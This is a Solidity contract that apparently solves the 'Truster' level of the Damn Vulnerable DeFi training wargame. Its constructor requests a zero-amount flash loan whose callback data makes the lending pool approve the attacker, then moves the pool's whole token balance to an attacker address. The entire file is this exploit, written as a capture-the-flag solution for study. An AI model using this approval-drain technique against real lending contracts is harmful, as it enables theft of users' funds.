// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../../src/Contracts/truster/TrusterLenderPool.sol";

/**
 * @title TrusterLenderPoolAttacker
 * @author pistomat
 */
contract TrusterLenderPoolAttacker {
    constructor(address _dvtAddress, address _trusterLenderPoolAddress, address _attackerAddress) {
        DamnValuableToken dvt = DamnValuableToken(_dvtAddress);
        TrusterLenderPool trusterLenderPool = TrusterLenderPool(_trusterLenderPoolAddress);

        uint256 tokens_in_pool = dvt.balanceOf(address(trusterLenderPool));
        trusterLenderPool.flashLoan({
            borrowAmount: 0,
            borrower: address(this),
            target: address(dvt),
            data: abi.encodeWithSignature("approve(address,uint256)", address(this), tokens_in_pool)
        });
        dvt.transferFrom(address(trusterLenderPool), address(_attackerAddress), tokens_in_pool);
    }
}
